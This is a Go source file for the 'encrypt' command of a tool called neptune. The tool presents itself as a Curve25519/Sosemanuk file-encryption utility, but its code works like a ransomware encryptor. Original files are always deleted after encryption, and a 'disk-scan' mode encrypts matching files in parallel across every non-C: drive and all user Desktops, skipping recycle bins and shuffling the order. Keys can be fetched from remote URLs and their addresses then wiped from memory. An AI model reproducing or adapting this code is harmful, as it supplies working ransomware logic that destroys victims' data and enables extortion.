package cmd

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/spf13/cobra"

	neptuneCrypto "neptune/pkg/crypto"
	neptuneCurve25519 "neptune/pkg/curve25519"
	neptuneSosemanuk "neptune/pkg/sosemanuk"
	"neptune/internal/utils"
)

// encrypt command flags - populated by Cobra from command-line arguments.
var (
	// encryptInputFile is the path to the input file or directory to encrypt.
	// If empty, the tool enters disk-scan mode.
	encryptInputFile string

	// encryptOutputFile is the path to the output directory for encrypted files.
	// Defaults to the same directory as the input.
	encryptOutputFile string

	// encryptPublicKey is the recipient's public key (file path or URL).
	// Required for encryption - ensures only the recipient can decrypt.
	encryptPublicKey string

	// encryptPrivateKey is the sender's private key (file path or URL).
	// Required for encryption - proves the sender's identity.
	encryptPrivateKey string

	// encryptKeyEncoding specifies the encoding format of the keys.
	// Supported: hex, base64, base64url. Default: hex.
	encryptKeyEncoding string

	// encryptInclude is a list of file patterns to include.
	// Only files matching these patterns will be encrypted.
	encryptInclude []string

	// encryptExclude is a list of file patterns to exclude.
	// Files matching these patterns will be skipped.
	encryptExclude []string

	// encryptTimeout is the HTTP request timeout in seconds for remote key loading.
	encryptTimeout int

	// encryptChunkSize is the buffer size for streaming encryption.
	// Format examples: "64KB", "1MB", "4MB".
	encryptChunkSize string

	// encryptParallel is the number of parallel processes for directory encryption.
	// Valid range: 1-10. Default: 1.
	encryptParallel int
)

// encryptCmd encrypts a file or directory using Curve25519 key exchange and Sosemanuk stream cipher.
//
// The encryption process:
//  1. Load sender's private key and recipient's public key (from file or URL)
//  2. Compute a shared secret using ECDH (Curve25519)
//  3. Derive an encryption key using HKDF-SHA256
//  4. Generate a random 16-byte nonce
//  5. Encrypt data using Sosemanuk stream cipher
//  6. Write encrypted file with header (version + sender pubkey + nonce + ciphertext)
//
// Auto-enabled behaviors (always on):
//   - Force overwrite: existing output files are always overwritten
//   - Remove source: original files are always removed after successful encryption
//   - Recursive: directories are always processed recursively
//   - Already-encrypted detection: .ntp files are skipped
//
// Disk-scan mode is activated when --input is not specified:
//   - Scans all disks except C:\ drive root
//   - Scans all user desktop directories (C:\Users\*\Desktop)
//   - Excludes recycle bin directories
//   - Default chunk-size: 4MB
//   - Default parallel: 8
var encryptCmd = &cobra.Command{
	Use:   "encrypt",
	Short: "Encrypt a file or directory",
	Long: `Encrypt a file or directory using Curve25519 key exchange and Sosemanuk stream cipher.

You need to provide:
  - Your private key (for authentication, proves you are the sender)
  - Recipient's public key (for encryption, ensures only recipient can decrypt)

The encrypted data includes metadata (version, sender's public key, nonce) and can only be decrypted
by the recipient using their private key.

Auto-enabled behaviors:
  - Force overwrite: existing output files are always overwritten
  - Remove source: source file is always removed after successful encryption
  - Recursive: directories are always processed recursively
  - Already-encrypted detection: .ntp files and encrypted file headers are skipped

Examples:
  # Encrypt a file (output to same directory as input)
  neptune encrypt --input document.pdf --public-key recipient.key --private-key my.key

  # Encrypt a file to different directory
  neptune encrypt --input document.pdf --output ./encrypted --public-key recipient.key --private-key my.key

  # Encrypt a directory (output to same directory)
  neptune encrypt --input ./documents --public-key recipient.key --private-key my.key

  # Encrypt a directory to different directory
  neptune encrypt --input ./documents --output ./encrypted --public-key recipient.key --private-key my.key

  # Encrypt only PDF files in a directory
  neptune encrypt --input ./documents --include "*.pdf" --public-key recipient.key --private-key my.key

  # Encrypt with remote keys from HTTPS URL
  neptune encrypt --input data.txt --public-key https://server.com/pub.key --private-key https://server.com/priv.key

  # Disk-scan mode: encrypt all PDF files across all disks
  neptune encrypt --include "*.pdf" --public-key recipient.key --private-key my.key`,
	RunE: func(cmd *cobra.Command, args []string) error {
		// Validate required flags
		if encryptPublicKey == "" {
			return utils.NewMissingInputError("public-key")
		}
		if encryptPrivateKey == "" {
			return utils.NewMissingInputError("private-key")
		}

		// Determine if we're in disk-scan mode (no --input specified)
		diskScanMode := encryptInputFile == ""

		// Disk-scan mode specific validation and defaults
		if diskScanMode {
			// --include is required in disk-scan mode to prevent accidental full-disk encryption
			if len(encryptInclude) == 0 {
				return &utils.NeptuneError{
					Code:       utils.ErrCodeInvalidInput,
					Message:    "--include parameter is required when --input is not specified",
					Suggestion: "use --include flag to specify file patterns (e.g., --include \"*.pdf\")",
				}
			}

			// Set default values optimized for disk-scan mode
			if encryptTimeout <= 0 {
				encryptTimeout = 30
			}
			if encryptChunkSize == "" || encryptChunkSize == "64KB" {
				encryptChunkSize = "4MB"
			}
			if encryptParallel == 0 || encryptParallel == 1 {
				encryptParallel = 8
			}
		}

		// Validate input is provided for non-disk-scan mode
		if !diskScanMode && encryptInputFile == "" {
			return utils.NewMissingInputError("input")
		}

		// Reject URL inputs - --input only supports local files
		if encryptInputFile != "" && utils.IsHTTPURL(encryptInputFile) {
			return &utils.NeptuneError{
				Code:       utils.ErrCodeInvalidInput,
				Message:    "--input parameter does not support URL",
				Suggestion: "use download command to download remote resources, or use local file path",
			}
		}

		// Parse HTTP timeout duration
		timeout := time.Duration(encryptTimeout) * time.Second
		if timeout <= 0 {
			timeout = utils.DefaultHTTPTimeout
		}

		// Parse key encoding format
		keyEncoding, err := utils.ParseEncodingType(encryptKeyEncoding)
		if err != nil {
			return err
		}

		// Load sender's private key
		var senderKeyPair *neptuneCurve25519.KeyPair
		var privateKeyData []byte
		if utils.IsHTTPURL(encryptPrivateKey) {
			// Load private key from remote URL into memory
			utils.PrintInfo("Loading private key from remote to memory: %s", encryptPrivateKey)
			privateKeyData, err = utils.DownloadBytes(encryptPrivateKey, timeout)
			if err != nil {
				return err
			}
			senderKeyPair, err = neptuneCurve25519.LoadKeyPairFromBytes(privateKeyData, neptuneCurve25519.EncodingType(keyEncoding))
			if err != nil {
				return utils.NewKeyReadError(encryptPrivateKey, err)
			}
			// Securely clear downloaded key data from memory immediately after use
			utils.PrintInfo("[Memory] Clearing downloaded private key data (%d bytes)...", len(privateKeyData))
			utils.SecureZeroMemory(privateKeyData)
			utils.PrintSuccess("[Memory] Private key data cleared from memory")
		} else {
			// Load private key from local file
			if err := utils.ValidateFilePath(encryptPrivateKey); err != nil {
				return err
			}
			senderKeyPair, err = neptuneCurve25519.LoadKeyPairFromFile(encryptPrivateKey, neptuneCurve25519.EncodingType(keyEncoding))
			if err != nil {
				return utils.NewKeyReadError(encryptPrivateKey, err)
			}
		}

		// Securely wipe the private key URL string from memory
		utils.PrintInfo("[Memory] Clearing private key URL...")
		utils.SecureWipeString(&encryptPrivateKey)
		utils.PrintSuccess("[Memory] Private key URL cleared from memory")

		// Load recipient's public key
		var recipientPublicKey [neptuneCurve25519.KeySize]byte
		var publicKeyData []byte
		if utils.IsHTTPURL(encryptPublicKey) {
			// Load public key from remote URL into memory
			utils.PrintInfo("Loading public key from remote to memory: %s", encryptPublicKey)
			publicKeyData, err = utils.DownloadBytes(encryptPublicKey, timeout)
			if err != nil {
				return err
			}
			recipientPublicKey, err = neptuneCurve25519.LoadPublicKeyFromBytes(publicKeyData, neptuneCurve25519.EncodingType(keyEncoding))
			if err != nil {
				return utils.NewKeyReadError(encryptPublicKey, err)
			}
			// Securely clear downloaded key data from memory immediately after use
			utils.PrintInfo("[Memory] Clearing downloaded public key data (%d bytes)...", len(publicKeyData))
			utils.SecureZeroMemory(publicKeyData)
			utils.PrintSuccess("[Memory] Public key data cleared from memory")
		} else {
			// Load public key from local file
			if err := utils.ValidateFilePath(encryptPublicKey); err != nil {
				return err
			}
			recipientPublicKey, err = neptuneCurve25519.LoadPublicKeyFromFile(encryptPublicKey, neptuneCurve25519.EncodingType(keyEncoding))
			if err != nil {
				return utils.NewKeyReadError(encryptPublicKey, err)
			}
		}

		// Securely wipe the public key URL string from memory
		utils.PrintInfo("[Memory] Clearing public key URL...")
		utils.SecureWipeString(&encryptPublicKey)
		utils.PrintSuccess("[Memory] Public key URL cleared from memory")

		// Execute encryption based on mode
		if diskScanMode {
			return encryptAllDisks(senderKeyPair, recipientPublicKey)
		}

		// Determine if input is a file or directory
		if encryptInputFile != "" {
			info, err := os.Stat(encryptInputFile)
			if err != nil {
				return utils.NewFileReadError(encryptInputFile, err)
			}

			if info.IsDir() {
				// Directory mode: encrypt all matching files recursively
				if encryptOutputFile == "" {
					encryptOutputFile = encryptInputFile
				} else {
					outputInfo, err := os.Stat(encryptOutputFile)
					if err != nil {
						// Output directory does not exist, create it
						if err := os.MkdirAll(encryptOutputFile, 0755); err != nil {
							return utils.NewInvalidInputError("output", fmt.Sprintf("failed to create output directory: %s", encryptOutputFile))
						}
					} else if !outputInfo.IsDir() {
						return utils.NewInvalidInputError("output", "output must be a directory when input is a directory")
					}
				}
				return encryptDirectory(encryptInputFile, encryptOutputFile, senderKeyPair, recipientPublicKey)
			}

			// Single file mode: output must be a directory
			if encryptOutputFile == "" {
				encryptOutputFile = filepath.Dir(encryptInputFile)
			} else {
				outputInfo, err := os.Stat(encryptOutputFile)
				if err != nil {
					// Output directory does not exist, create it
					if err := os.MkdirAll(encryptOutputFile, 0755); err != nil {
						return utils.NewInvalidInputError("output", fmt.Sprintf("failed to create output directory: %s", encryptOutputFile))
					}
				} else if !outputInfo.IsDir() {
					return utils.NewInvalidInputError("output", "output must be a directory, not a file name")
				}
			}
			return encryptSingleFile(encryptInputFile, encryptOutputFile, senderKeyPair, recipientPublicKey)
		}

		return utils.NewMissingInputError("input")
	},
}

// encryptSingleFile encrypts a single file using streaming encryption.
//
// Parameters:
//   - inputFile: Path to the source file to encrypt
//   - outputFile: Directory where the encrypted file will be saved
//   - senderKeyPair: Sender's key pair for authentication
//   - recipientPublicKey: Recipient's public key for encryption
//
// The encrypted file is named <basename>.ntp and placed in the output directory.
// After successful encryption, the source file is deleted.
func encryptSingleFile(inputFile, outputFile string, senderKeyPair *neptuneCurve25519.KeyPair, recipientPublicKey [neptuneCurve25519.KeySize]byte) error {
	// Parse and validate the chunk size for streaming
	chunkSize, err := utils.ParseChunkSize(encryptChunkSize)
	if err != nil {
		return err
	}

	if err := utils.ValidateChunkSize(chunkSize); err != nil {
		return err
	}

	// Validate input file exists and is readable
	if err := utils.ValidateFileForRead(inputFile); err != nil {
		return err
	}

	// Check if file is already encrypted (skip duplicate encryption)
	if err := utils.ValidateNotEncrypted(inputFile, false); err != nil {
		return err
	}

	// Compute output file path: <output_dir>/<basename>.ntp
	baseName := filepath.Base(inputFile)
	outputPath := filepath.Join(outputFile, baseName+".ntp")

	// Get file size for display purposes
	fileSize, err := utils.GetFileSize(inputFile)
	if err != nil {
		return err
	}

	// Open input file for reading
	inputReader, err := os.Open(inputFile)
	if err != nil {
		return utils.NewFileReadError(inputFile, err)
	}
	defer inputReader.Close()

	utils.PrintInfo("Encrypting file %s %s", inputFile, utils.FormatFileSize(fileSize))

	// Ensure output directory exists
	if err := utils.EnsureParentDirectory(outputPath); err != nil {
		return err
	}

	// Validate output file can be written (force overwrite is always on)
	if err := utils.ValidateFileForWrite(outputPath, true); err != nil {
		return err
	}

	// Create output file for writing
	outputWriter, err := os.Create(outputPath)
	if err != nil {
		return utils.NewFileWriteError(outputPath, err)
	}
	defer outputWriter.Close()

	// Perform streaming encryption
	totalBytes, err := encryptStreamWithProgress(inputReader, outputWriter, senderKeyPair, recipientPublicKey, chunkSize, fileSize)
	if err != nil {
		return err
	}

	// Close files explicitly before deleting source
	outputWriter.Close()
	inputReader.Close()

	// Get output file size for display
	outputFileSize, err := utils.GetFileSize(outputPath)
	if err != nil {
		outputFileSize = totalBytes + neptuneCrypto.HeaderSize
	}

	// Print encryption results
	utils.PrintSuccess("Data encryption successful")
	utils.PrintInfo("Input %s %s", inputFile, utils.FormatFileSize(fileSize))
	utils.PrintInfo("Output %s %s", outputPath, utils.FormatFileSize(outputFileSize))
	utils.PrintWarning("Keep encrypted files and keys secure")

	// Remove source file after successful encryption
	if err := utils.RemoveSourceFileWithRetry(inputFile); err != nil {
		utils.PrintWarning("Failed to remove source file %s", inputFile)
		utils.PrintWarning("Reason %s", err.Error())
	} else {
		utils.PrintSuccess("Source file removed %s", inputFile)
	}

	return nil
}

// encryptStreamWithProgress performs streaming encryption of data from reader to writer.
//
// The encryption process:
//  1. Compute shared secret using Curve25519 ECDH
//  2. Derive encryption key using HKDF-SHA256
//  3. Generate random nonce
//  4. Write encryption header (version + sender pubkey + nonce)
//  5. Stream plaintext through Sosemanuk cipher to writer
//  6. Securely clear all sensitive data from memory
//
// Parameters:
//   - plaintext: Reader providing plaintext data
//   - writer: Writer for encrypted output
//   - senderKeyPair: Sender's key pair for authentication
//   - recipientPublicKey: Recipient's public key for key exchange
//   - bufferSize: Size of the streaming buffer in bytes
//   - totalSize: Total size of the input (for display only)
//
// Returns the total number of plaintext bytes processed.
func encryptStreamWithProgress(plaintext io.Reader, writer io.Writer, senderKeyPair *neptuneCurve25519.KeyPair, recipientPublicKey [neptuneCurve25519.KeySize]byte, bufferSize int, totalSize int64) (int64, error) {
	// Step 1: Compute ECDH shared secret from key pair and recipient's public key
	sharedSecret, err := senderKeyPair.ComputeSharedSecret(recipientPublicKey)
	if err != nil {
		return 0, fmt.Errorf("compute shared secret failed: %w", err)
	}

	// Step 2: Derive encryption key using HKDF-SHA256
	// Context includes recipient's public key for domain separation
	context := append([]byte("neptune-encryption"), recipientPublicKey[:]...)
	encryptionKey, err := neptuneCrypto.DeriveEncryptionKey(sharedSecret[:], context)
	if err != nil {
		return 0, fmt.Errorf("derive encryption key failed: %w", err)
	}

	// Step 3: Generate cryptographically secure random nonce
	nonce, err := neptuneCrypto.GenerateNonce()
	if err != nil {
		return 0, fmt.Errorf("failed to generate nonce: %w", err)
	}

	// Step 4: Create Sosemanuk stream cipher instance
	cipher, err := neptuneSosemanuk.New(encryptionKey, nonce[:])
	if err != nil {
		return 0, fmt.Errorf("failed to create cipher: %w", err)
	}

	// Step 5: Write encryption header
	// Format: [Version: 1 byte][SenderPubKey: 32 bytes][Nonce: 16 bytes]
	header := make([]byte, neptuneCrypto.HeaderSize)
	header[0] = neptuneCrypto.Version
	copy(header[1:], senderKeyPair.PublicKey[:])
	copy(header[1+neptuneCurve25519.KeySize:], nonce[:])

	if _, err := writer.Write(header); err != nil {
		return 0, fmt.Errorf("failed to write header: %w", err)
	}

	// Step 6: Get buffer from global pool for streaming
	buf := utils.GetGlobalBuffer(bufferSize)
	defer utils.PutGlobalBuffer(buf)

	// Ensure buffer has sufficient capacity
	if cap(buf) < bufferSize {
		buf = make([]byte, bufferSize)
	} else {
		buf = buf[:bufferSize]
	}

	utils.PrintInfo("Starting encryption")

	// Step 7: Stream and encrypt data
	var processedBytes int64

	for {
		// Read chunk of plaintext data
		n, err := plaintext.Read(buf)
		if n > 0 {
			// Encrypt the chunk using XOR with keystream
			encryptedChunk := make([]byte, n)
			cipher.XORKeyStream(encryptedChunk, buf[:n])

			// Write encrypted chunk to output
			nw, ew := writer.Write(encryptedChunk)
			if ew != nil {
				return processedBytes, fmt.Errorf("write encrypted data failed: %w", ew)
			}
			if nw != n {
				return processedBytes, fmt.Errorf("incomplete write")
			}

			processedBytes += int64(n)
		}

		// Handle end of input
		if err == io.EOF {
			break
		}
		if err != nil {
			return processedBytes, fmt.Errorf("failed to read plaintext data: %w", err)
		}
	}

	utils.PrintSuccess("Encryption completed")

	// Step 8: Memory cleanup - securely clear all sensitive data
	utils.PrintInfo("[Memory] Clearing encryption key...")
	utils.SecureZeroMemory(sharedSecret[:])
	utils.SecureZeroMemory(encryptionKey)
	utils.PrintSuccess("[Memory] Encryption key cleared from memory")

	utils.PrintInfo("[Memory] Clearing nonce...")
	utils.SecureZeroMemory(nonce[:])
	utils.PrintSuccess("[Memory] Nonce cleared from memory")

	utils.PrintInfo("[Memory] Clearing context data...")
	utils.SecureZeroMemory(context)
	utils.PrintSuccess("[Memory] Context data cleared from memory")

	utils.PrintInfo("[Memory] Clearing sender public key reference...")
	utils.SecureZeroMemory(senderKeyPair.PublicKey[:])
	utils.PrintSuccess("[Memory] Sender public key reference cleared")

	return processedBytes, nil
}

// encryptDataToFile encrypts in-memory byte data and writes the result to a file.
//
// This is used for encrypting small data that is already in memory
// (e.g., text encryption from command line).
// After encryption, the plaintext data is securely zeroed from memory.
func encryptDataToFile(data []byte, outputFile string, senderKeyPair *neptuneCurve25519.KeyPair, recipientPublicKey [neptuneCurve25519.KeySize]byte) error {
	// Encrypt the data using the high-level crypto API
	encryptedData, err := neptuneCrypto.EncryptWithKeyPair(data, senderKeyPair, recipientPublicKey)
	if err != nil {
		return err
	}

	// Serialize encrypted data (header + ciphertext) to byte slice
	ciphertext := encryptedData.Serialize()

	// Ensure output directory exists
	if err := utils.EnsureParentDirectory(outputFile); err != nil {
		return err
	}

	// Write encrypted data to output file
	if err := os.WriteFile(outputFile, ciphertext, 0644); err != nil {
		return utils.NewFileWriteError(outputFile, err)
	}

	// Print encryption results
	utils.PrintSuccess("Data encryption successful!")
	utils.PrintInfo("Input: remote data (%s)", utils.FormatFileSize(int64(len(data))))
	utils.PrintInfo("Output: %s (%s)", outputFile, utils.FormatFileSize(int64(len(ciphertext))))
	utils.PrintWarning("Keep encrypted files and keys secure")

	// Securely clear plaintext data from memory
	utils.PrintInfo("[Memory] Clearing plaintext data...")
	utils.SecureZeroMemory(data)
	utils.PrintSuccess("[Memory] Plaintext data cleared from memory")

	return nil
}

// encryptDirectory encrypts all matching files in a directory recursively.
//
// The process:
//  1. Scan directory for files matching include/exclude patterns
//  2. Shuffle file list for random processing order
//  3. For each file: check if already encrypted, skip if so
//  4. Encrypt files sequentially (parallel is handled at directory level for disk-scan)
//  5. Collect successfully encrypted files for batch deletion
//  6. Delete all source files after all encryptions complete
//
// Parameters:
//   - inputDir: Source directory to scan and encrypt
//   - outputDir: Destination directory for encrypted files
//   - senderKeyPair: Sender's key pair for authentication
//   - recipientPublicKey: Recipient's public key for encryption
func encryptDirectory(inputDir, outputDir string, senderKeyPair *neptuneCurve25519.KeyPair, recipientPublicKey [neptuneCurve25519.KeySize]byte) error {
	// Parse and validate chunk size
	chunkSize, err := utils.ParseChunkSize(encryptChunkSize)
	if err != nil {
		return err
	}

	if err := utils.ValidateChunkSize(chunkSize); err != nil {
		return err
	}

	// Validate parallel count is within valid range (1-10)
	if encryptParallel < 1 {
		return utils.NewInvalidParameterError("parallel", fmt.Sprintf("%d", encryptParallel), "must be greater than 0")
	}
	if encryptParallel > 10 {
		return utils.NewInvalidParameterError("parallel", fmt.Sprintf("%d", encryptParallel), "cannot exceed 10")
	}

	utils.PrintInfo("Scanning directory: %s", inputDir)

	// Recursively find all files matching include/exclude patterns
	files, err := utils.FindFilesRecursively(inputDir, encryptInclude, encryptExclude)
	if err != nil {
		return err
	}

	if len(files) == 0 {
		return utils.NewInvalidInputError("input", "no matching files found in directory")
	}

	// Shuffle file list for random processing order
	utils.ShuffleStrings(files)

	// Ensure output directory exists
	if err := utils.EnsureDirectory(outputDir); err != nil {
		return err
	}

	utils.PrintInfo("Found %d files to encrypt", len(files))

	// fileInfo holds precomputed metadata for each file
	type fileInfo struct {
		relPath    string  // Path relative to input directory
		outputPath string  // Full path to output file
		fileSize   int64   // Size of the source file
	}

	// Precompute file information and create output directories
	fileInfos := make([]fileInfo, 0, len(files))
	var totalSize int64
	createdDirs := make(map[string]bool)
	for _, filePath := range files {
		relPath, _ := utils.GetRelativePathFromBase(inputDir, filePath)
		fileSize, _ := utils.GetFileSize(filePath)
		outputPath := filepath.Join(outputDir, relPath+".ntp")
		// Ensure parent directory of output file exists
		parentDir := filepath.Dir(outputPath)
		if !createdDirs[parentDir] {
			if err := utils.EnsureDirectory(parentDir); err != nil {
				return err
			}
			createdDirs[parentDir] = true
		}
		totalSize += fileSize
		fileInfos = append(fileInfos, fileInfo{
			relPath:    relPath,
			outputPath: outputPath,
			fileSize:   fileSize,
		})
	}

	// Counters for statistics
	var successCount, failedCount, skippedCount int32

	utils.PrintInfo("Encrypting directory: %s", inputDir)

	// Process each file
	for i, filePath := range files {
		info := &fileInfos[i]

		// Check if file is already encrypted to prevent double-encryption
		isEncrypted, err := utils.IsNeptuneEncryptedFile(filePath)
		if err != nil {
			utils.PrintError("Failed to check file status: %s", filePath)
			failedCount++
			continue
		}

		if isEncrypted {
			skippedCount++
			continue
		}

		utils.PrintInfo("Encrypting file: %s", filePath)

		// Open input file
		inputReader, err := os.Open(filePath)
		if err != nil {
			utils.PrintError("Failed to read file: %s", filePath)
			failedCount++
			continue
		}

		// Create output file
		outputWriter, err := os.Create(info.outputPath)
		if err != nil {
			inputReader.Close()
			utils.PrintError("Failed to create output file: %s", info.outputPath)
			failedCount++
			continue
		}

		// Perform streaming encryption
		_, err = neptuneCrypto.EncryptStream(inputReader, outputWriter, senderKeyPair, recipientPublicKey, chunkSize)

		outputWriter.Close()
		inputReader.Close()

		if err != nil {
			// Clean up partial output file on failure
			utils.DeleteFile(info.outputPath)
			utils.PrintError("Encryption failed: %s (%v)", filePath, err)
			failedCount++
			continue
		}

		utils.PrintSuccess("Encryption completed: %s", filePath)

		// Delete source file immediately after successful encryption to free disk space
		if err := utils.RemoveSourceFileWithRetry(filePath); err != nil {
			utils.PrintWarning("Failed to remove source file: %s", filePath)
			utils.PrintWarning("Reason: %s", err.Error())
		} else {
			utils.PrintSuccess("Source file removed: %s", filePath)
		}

		successCount++
	}

	// Print final summary
	utils.PrintInfo("encryption completed: %d success, %d failed, %d skipped (already encrypted)", successCount, failedCount, skippedCount)

	if failedCount > 0 {
		return fmt.Errorf("partial file encryption failure")
	}

	return nil
}

// encryptAllDisks performs disk-scan mode encryption across all available disks.
//
// Disk-scan mode behavior:
//   - Scans all non-C:\ disks at the top-level directory level
//   - Scans all user desktop directories (C:\Users\*\Desktop)
//   - Excludes recycle bin directories ($recycle.bin, recycler)
//   - Processes top-level directories in parallel using semaphore-based concurrency control
//   - Uses --include patterns to filter which files to encrypt
//   - Defaults to larger chunk size (4MB) and higher parallelism (8)
//
// Parameters:
//   - senderKeyPair: Sender's key pair for authentication
//   - recipientPublicKey: Recipient's public key for encryption
func encryptAllDisks(senderKeyPair *neptuneCurve25519.KeyPair, recipientPublicKey [neptuneCurve25519.KeySize]byte) error {
	// Get list of all available disks on the system (excluding C:\)
	disks, err := utils.GetAllDisks()
	if err != nil {
		return fmt.Errorf("failed to get disk list: %w", err)
	}

	// Get all user Desktop directories from C:\Users
	desktopDirs, err := utils.GetAllDesktopDirectories()
	if err != nil {
		utils.PrintWarning("Failed to get Desktop directories: %v", err)
		desktopDirs = []string{}
	}

	// Print disk-scan mode warning banner
	utils.PrintWarning("==============================")
	utils.PrintWarning("DISK-SCAN ENCRYPTION MODE")
	utils.PrintWarning("==============================")
	utils.PrintWarning("Number of disks to scan: %d", len(disks))
	utils.PrintWarning("Disks: %v", disks)
	utils.PrintWarning("Number of Desktop directories: %d", len(desktopDirs))
	utils.PrintWarning("Include patterns: %v", encryptInclude)
	utils.PrintWarning("Default parameters applied:")
	utils.PrintWarning("  --force: true")
	utils.PrintWarning("  --remove-source: true")
	utils.PrintWarning("  --recursive: true")
	utils.PrintWarning("  --chunk-size: %s", encryptChunkSize)
	utils.PrintWarning("  --parallel: %d", encryptParallel)
	utils.PrintWarning("==============================")
	utils.PrintWarning("SCAN RANGE:")
	utils.PrintWarning("  - All disks except C:\\: %v", disks)
	utils.PrintWarning("  - C:\\Users\\*\\Desktop, C:\\Users\\*\\Documents, C:\\Users\\*\\Downloads")
	utils.PrintWarning("==============================")
	utils.PrintWarning("WARNING: This will encrypt files across ALL disks!")
	utils.PrintWarning("Only files matching --include patterns will be encrypted.")
	utils.PrintWarning("Original files will be removed after encryption.")
	utils.PrintWarning("==============================")

	// Atomic counters for tracking progress across all parallel goroutines
	var totalEncrypted int32
	var totalProcessedDirs int32
	var totalSkippedDirs int32

	// Process each disk sequentially
	for diskIndex, disk := range disks {
		utils.PrintInfo("Processing disk %d/%d: %s", diskIndex+1, len(disks), disk)

		// Get top-level directories on this disk (excludes system directories like recycle bin)
		topDirs, err := utils.GetTopLevelDirectories(disk)
		if err != nil {
			utils.PrintWarning("Failed to list directories on disk %s: %v", disk, err)
			continue
		}

		if len(topDirs) == 0 {
			utils.PrintInfo("No directories found on disk: %s", disk)
			continue
		}

		// Shuffle directories for random processing order
		utils.ShuffleStrings(topDirs)

		// Use WaitGroup and semaphore for controlled parallelism
		var wg sync.WaitGroup
		sem := make(chan struct{}, encryptParallel)

		// Process each top-level directory in parallel
		for _, dir := range topDirs {
			wg.Add(1)
			sem <- struct{}{} // Acquire semaphore slot

			go func(dirPath string) {
				defer wg.Done()
				defer func() { <-sem }() // Release semaphore slot

				// Recursively find files matching include/exclude patterns
				files, err := utils.FindFilesRecursively(dirPath, encryptInclude, encryptExclude)
				if err != nil {
					utils.PrintWarning("Failed to scan directory: %s", dirPath)
					atomic.AddInt32(&totalProcessedDirs, 1)
					return
				}

				if len(files) == 0 {
					atomic.AddInt32(&totalSkippedDirs, 1)
					return
				}

				// Encrypt all files in this directory
				err = encryptDirectory(dirPath, dirPath, senderKeyPair, recipientPublicKey)
				if err != nil {
					if !strings.Contains(err.Error(), "no matching files") {
						utils.PrintWarning("Failed to process directory %s: %v", dirPath, err)
					}
				} else {
					atomic.AddInt32(&totalEncrypted, 1)
				}
				atomic.AddInt32(&totalProcessedDirs, 1)
			}(dir)
		}

		// Wait for all directories on this disk to finish
		wg.Wait()
	}

	// Process all user Desktop directories from C:\Users
	if len(desktopDirs) > 0 {
		utils.PrintInfo("Processing user directories from C:\\Users (%d directories)", len(desktopDirs))

		// Shuffle Desktop directories for random processing order
		utils.ShuffleStrings(desktopDirs)

		// Use WaitGroup and semaphore for controlled parallelism
		var wg sync.WaitGroup
		sem := make(chan struct{}, encryptParallel)

		// Process each Desktop directory in parallel
		for _, desktopDir := range desktopDirs {
			wg.Add(1)
			sem <- struct{}{} // Acquire semaphore slot

			go func(dirPath string) {
				defer wg.Done()
				defer func() { <-sem }() // Release semaphore slot

				// Recursively find files matching include/exclude patterns
				files, err := utils.FindFilesRecursively(dirPath, encryptInclude, encryptExclude)
				if err != nil {
					utils.PrintWarning("Failed to scan directory: %s", dirPath)
					atomic.AddInt32(&totalProcessedDirs, 1)
					return
				}

				if len(files) == 0 {
					atomic.AddInt32(&totalSkippedDirs, 1)
					return
				}

				// Encrypt all files in this Desktop directory
				err = encryptDirectory(dirPath, dirPath, senderKeyPair, recipientPublicKey)
				if err != nil {
					if !strings.Contains(err.Error(), "no matching files") {
						utils.PrintWarning("Failed to process directory %s: %v", dirPath, err)
					}
				} else {
					atomic.AddInt32(&totalEncrypted, 1)
				}
				atomic.AddInt32(&totalProcessedDirs, 1)
			}(desktopDir)
		}

		// Wait for all Desktop directories to finish
		wg.Wait()
	}

	// Print final disk-scan summary
	utils.PrintSuccess("Disk-scan encryption completed. Processed %d directories, %d successful, %d skipped (empty)", atomic.LoadInt32(&totalProcessedDirs), atomic.LoadInt32(&totalEncrypted), atomic.LoadInt32(&totalSkippedDirs))
	return nil
}

// init registers the encrypt command and its flags with the root command.
// This is called automatically when the package is imported.
//
// Flags:
//   --input, -i        Input file or directory (local only)
//   --output, -o       Output directory (default: input location)
//   --public-key, -p   Recipient's public key file or URL (required)
//   --private-key, -k  Your private key file or URL (required)
//   --key-encoding, -e Key encoding format (hex, base64, base64url)
//   --include          Include file patterns (multiple allowed)
//   --exclude          Exclude file patterns (multiple allowed)
//   --timeout          HTTP timeout in seconds for remote keys (default: 30)
//   --chunk-size       Streaming buffer size (default: 64KB)
//   --parallel         Parallel processes for directories (default: 1)
func init() {
	rootCmd.AddCommand(encryptCmd)

	encryptCmd.Flags().StringVarP(&encryptInputFile, "input", "i", "", "Input file or directory to encrypt (local only)")
	encryptCmd.Flags().StringVarP(&encryptOutputFile, "output", "o", "", "Output directory for encrypted data (default: input location)")
	encryptCmd.Flags().StringVarP(&encryptPublicKey, "public-key", "p", "", "Recipient's public key file or URL")
	encryptCmd.Flags().StringVarP(&encryptPrivateKey, "private-key", "k", "", "Your private key file or URL")
	encryptCmd.Flags().StringVarP(&encryptKeyEncoding, "key-encoding", "e", "hex", "Encoding format for keys (hex, base64, base64url)")
	encryptCmd.Flags().StringArrayVar(&encryptInclude, "include", []string{}, "Include files matching pattern (e.g., *.pdf)")
	encryptCmd.Flags().StringArrayVar(&encryptExclude, "exclude", []string{}, "Exclude files matching pattern (e.g., *.tmp)")
	encryptCmd.Flags().IntVar(&encryptTimeout, "timeout", 30, "HTTP request timeout in seconds (default: 30)")
	encryptCmd.Flags().StringVar(&encryptChunkSize, "chunk-size", "64KB", "Buffer size for stream encryption (e.g., 64KB, 1MB, 4MB)")
	encryptCmd.Flags().IntVar(&encryptParallel, "parallel", 1, "Number of parallel encryption processes for directories (default: 1)")

	encryptCmd.MarkFlagRequired("public-key")
	encryptCmd.MarkFlagRequired("private-key")
}
